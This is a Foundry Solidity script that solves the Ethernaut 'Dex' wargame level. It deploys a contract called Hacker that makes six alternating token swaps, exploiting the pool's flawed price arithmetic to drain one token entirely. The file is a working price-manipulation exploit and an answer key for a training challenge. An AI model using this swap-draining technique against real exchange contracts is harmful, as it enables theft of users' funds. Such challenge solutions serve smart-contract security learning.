// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Dex} from "../../challenge-contracts/22-Dex.sol";
import {IERC20} from "../../challenge-contracts/lib/openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE make sure to change original function into "_createInstance()" for the correct challengeInstance address.
        address challengeInstance = _createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Get the Dex contract;
        Dex dex = Dex(challengeInstance);

        // Step 2: Get contract addresses for token 1 and token 2;
        address token1 = dex.token1();
        address token2 = dex.token2();
        console2.log("token 1 address is", token1);
        console2.log("token 2 address is", token2);

        // Step 3: Get token 2 balance of the Dex contract;
        uint balanceDexOriginal = IERC20(token2).balanceOf(challengeInstance);
        console2.log("Dex's token 2 balance is", balanceDexOriginal);

        // Step 4: Get token 2 balance of calling address;
        address heroAddress = vm.addr(heroPrivateKey);
        console2.log("heroAddress is", heroAddress);

        uint balanceToken1 = IERC20(token1).balanceOf(heroAddress);
        uint balanceToken2 = IERC20(token2).balanceOf(heroAddress);

        // Step 5: Deploy Hacker contract and get its address;
        Hacker hacker = new Hacker(challengeInstance);
        address hackerAddress = address(hacker);

        // Step 6: Transfer token 1 and token 2 balance of `heroAddress` to the Hacker contract;
        IERC20(token1).transfer(hackerAddress, balanceToken1);
        IERC20(token2).transfer(hackerAddress, balanceToken2);

        uint balance = IERC20(token2).balanceOf(hackerAddress);
        console2.log("Hacker's token 2 balance is", balance);

        // Step 7: Calling `swap()` function of the Hacker contract;
        hacker.swap();

        // Step 8: Confirm that the Hacker contract has successfully drain token 1 from the Dex contract.
        uint balanceDexAfter = IERC20(token2).balanceOf(challengeInstance);
        uint balanceHacker = IERC20(token2).balanceOf(hackerAddress);
        require(balanceDexAfter == 0, "Dex balance check failed");
        require(
            balanceHacker == balanceDexOriginal + balance,
            "Hacker balance check failed"
        );

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(22));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Hacker {
    address addrDex;
    Dex dex;
    address token1;
    address token2;
    uint balance;

    constructor(address dexAddress) {
        addrDex = dexAddress;
        dex = Dex(dexAddress);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    /*
                    Dex token 1         Dex token 2         Hacker token 1      Hacker token 2
Original            100                 100                 10                  10
Swap 1              90                  110                 20                  0
Swap 2              110                 86                  0                   24
Swap 3              80                  110                 30                  0
Swap 4              110                 69                  0                   41
Swap 5              45                  110                 65                  0
Swap 6              90                  0                   20                  110
    */
    function swap() external {
        balance = IERC20(token2).balanceOf(address(this));
        dex.approve(addrDex, type(uint).max);
        dex.swap(token2, token1, balance);
        console2.log(
            "token 1 balance is",
            IERC20(token1).balanceOf(address(this))
        );
        dex.swap(token1, token2, IERC20(token1).balanceOf(address(this)));
        console2.log(
            "token 2 balance is",
            IERC20(token2).balanceOf(address(this))
        );
        dex.swap(token2, token1, IERC20(token2).balanceOf(address(this)));
        console2.log(
            "token 1 balance is",
            IERC20(token1).balanceOf(address(this))
        );
        dex.swap(token1, token2, IERC20(token1).balanceOf(address(this)));
        console2.log(
            "token 2 balance is",
            IERC20(token2).balanceOf(address(this))
        );
        dex.swap(token2, token1, IERC20(token2).balanceOf(address(this)));
        console2.log(
            "token 1 balance is",
            IERC20(token1).balanceOf(address(this))
        );
        dex.swap(token1, token2, 45);
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
